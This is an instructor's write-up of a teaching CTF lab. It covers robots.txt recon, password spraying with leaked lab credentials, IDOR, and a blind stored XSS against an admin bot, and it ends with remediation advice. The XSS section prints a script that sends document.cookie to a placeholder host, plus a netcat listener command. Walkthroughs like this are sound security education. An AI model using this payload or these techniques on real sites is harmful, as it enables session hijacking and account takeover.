Nordic Archives - Writeup

I built this challenge to give my students some practice with OSINT and basic web attacks.
95% of frontend and alot of the backend is “vibe coded”.
The overall difficulty is somewhere between beginner and intermediate imo.

Setup (local run)

Start the lab using Docker Compose:

docker compose up --build

Part 1 — Vault flag

The first step is a classic recon:

GET /robots.txt

This file points to a disallowed path that is quite useful.
The page reveals guest credentials, which can be used to log in and review documents in the guest portal.

Logging into the guest portal, we discover an old password previously used by a staff member: Winter2021!.

Using this information together with staff email addresses gathered from the About page, we can perform some classic password spraying. Eventually, we discover that the user sofia.ek is using the password Winter2025!.

Once logged in as a staff member, we can read messages. The message ID is disclosed in the URL. Let’s try for IDOR. This eventuellay gives us access to other messages and we recover both a password and a hint.

Password: xqrl42x7

The hint points us to GitHub. There is a user named nordicarchives with a single repository:
https://github.com/nordicarchives/nordicarchives

Inside the repository, we find a vault key:

Vault key: nordicvault42secret

The final clue is an image exposed via the /services endpoint, which shows a username on a computer screen:

Username: k.andersson

With all of this information, we can authenticate to the /vault endpoint and retrieve the first flag. This endpoint can be found with basic enumeration.

Flag 2 — Admin flag (blind stored XSS)

The contact form is the key point here. Submitted messages are stored and later reviewed by an admin bot in the admin panel. The message body is rendered without escaping, allowing HTML and JavaScript to execute in the admin’s session context.

Additionally, the session cookie is not marked as HttpOnly, classic hint for session hijacking.

Example payload

<script>
new Image().src='http://ip:port/?d='+document.cookie
</script>

Listener

nc -lvnp 4444

When the admin bot loads the message, the callback is received. This gives us the admin session cookie, which can then be reused to access the admin panel. The admin flag is displayed on the dashboard.

Why this works

  • The admin bot logs in and opens /admin/messages/:id.
  • Message content is rendered without escaping, enabling stored XSS.
  • Session cookies are accessible via JavaScript.

How to make this safe (real world)

  • Always escape user-generated content in templates (EJS: use <%= instead of <%-).
  • Sanitize input if HTML support is required.
  • Enforce a strict Content Security Policy (CSP).
  • Set session cookies with HttpOnly, Secure, and SameSite=Strict.

Puppeteer bot implementation (how it’s wired)

The admin bot is implemented in services/admin-bot.js and performs the following steps:

  1. Builds the base URL from APP_BASE_URL (defaults to http://localhost:PORT).
  2. Launches Chromium using Puppeteer in headless mode.
  3. Logs in using ADMIN_EMAIL and ADMIN_PASSWORD.
  4. Visits /admin/messages/:id.
  5. Waits briefly before exiting (with a timeout).

Security takeaways

  • Escape or sanitize all user-controlled input.
  • Remove hints and credentials from public pages and robots.txt.
  • Use stronger authentication (MFA, rate limiting, lockouts).
  • Set secure session cookie flags and implement CSRF protection.
  • Store secrets outside of source control and rotate them regularly.
